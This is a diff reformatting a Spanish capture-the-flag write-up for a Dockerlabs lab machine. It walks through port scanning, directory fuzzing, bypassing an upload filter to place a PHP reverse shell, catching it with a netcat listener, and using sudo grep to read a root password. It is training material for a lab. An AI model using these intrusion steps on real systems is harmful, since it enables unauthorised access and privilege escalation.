@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Dockerlabs 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Dockerlabs ​​
+
+## 🖥️ Writeup - Dockerlabs
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Web` `PHP` `Gobuster` `File Upload` `Bypass` `RCE` `Sudoers`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip dockerlabs.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh dockerlabs.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-01 17:17 CET
 Nmap scan report for 172.17.0.2
@@ -73,10 +82,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
 ```
 
-Solo el puerto `80` está accesible.
-Accedemos por `HTTP` y nos encontramos una página que se asemeja a la página oficial de DockerLabs.
+Solo el puerto `80` está accesible. Accedemos por `HTTP` y nos encontramos una página que se asemeja a la página oficial de DockerLabs.
 
-# GOBUSTER
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -85,6 +93,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/d
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -108,10 +117,9 @@ Starting gobuster in directory enumeration mode
 Progress: 102351 / 1543906 (6.63%)
 ```
 
-Encontramos varios archivos `.php` y un directorio `/uploads`.
-Navegamos al archivo `machine.php` y nos encontramos un formulario de subida, suponemos que para subir las máquinas.
+Encontramos varios archivos `.php` y un directorio `/uploads`. Navegamos al archivo `machine.php` y nos encontramos un formulario de subida, suponemos que para subir las máquinas.
 
-![alt text](../../images/subida.png)
+![alt text](../../.gitbook/assets/subida.png)
 
 Intentamos subir una `reverse shell` en `PHP`, pero nos aparece el siguiente mensaje:
 
@@ -142,6 +150,7 @@ sudo nc -nlvp 4444
 Ahora sí, ejecutamos el archivo subido.
 
 Info:
+
 ```
 listening on [any] 4444 ...
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 35706
@@ -157,28 +166,33 @@ $
 
 Hemos recibido la `reverse shell` como el usuario `www-data`.
 
-# TTY
+## TTY
 
 Antes de buscar vectores de escalada de privilegios, vamos a hacer un tratamiento de TTY para tener una shell más interactiva, con los siguientes comandos:
 
 ```bash
 script /dev/null -c bash
 ```
+
 `ctrl Z`
+
 ```bash
 stty raw -echo; fg
 ```
+
 ```bash
 reset xterm
 ```
+
 ```bash
 export TERM=xterm
 ```
+
 ```bash
 export BASH=bash
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`.
 
@@ -187,6 +201,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for www-data on f5e2571a1bae:
     env_reset, mail_badpass,
@@ -216,6 +231,7 @@ sudo /usr/bin/grep '' $LFILE
 ```
 
 Info:
+
 ```
 dockerlabsmolamogollon123
 ```
@@ -227,6 +243,7 @@ su root
 ```
 
 Info:
+
 ```
 root@f5e2571a1bae:/opt# whoami
 root
